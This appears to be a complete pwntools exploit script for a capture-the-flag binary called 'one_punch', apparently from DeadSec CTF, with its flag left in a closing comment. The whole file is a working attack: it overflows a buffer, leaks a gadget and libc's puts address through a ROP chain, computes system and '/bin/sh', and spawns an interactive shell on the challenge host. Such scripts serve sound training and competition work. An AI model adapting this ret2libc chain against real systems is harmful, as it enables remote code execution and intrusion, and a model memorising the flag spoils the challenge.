#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./one_punch_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("netcat.deadsec.quest", 31794)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = b'A' * 120

	leak = r.recvuntil(b'cape! ')
	pop_rdi_leak = r.recv(14).strip().decode('utf-8')
	pop_rdi_addr = int(pop_rdi_leak, 16)
	puts_plt_got = pop_rdi_addr + 11503
	puts_plt = pop_rdi_addr + 405
	init = pop_rdi_addr + 160

	success(f'{hex(pop_rdi_addr)=}')

	r.clean()
	r.sendline(offset + p64(init) + p64(pop_rdi_addr) + p64(puts_plt_got) + p64(puts_plt))

	leak = r.recvline().rstrip()
	libc_addr = unpack(leak, 'all')
	system_addr = libc_addr - 0x30170
	binsh = libc_addr + 0x1577c8

	success(f'{hex(libc_addr)=}')
	success(f'{hex(system_addr)=}')
	r.sendline(offset + p64(pop_rdi_addr) + p64(binsh) + p64(system_addr))
	r.interactive()


if __name__ == "__main__":
	main()

# dead{I_w4nn4_b3_4_s41ky0u_H3R00000000}
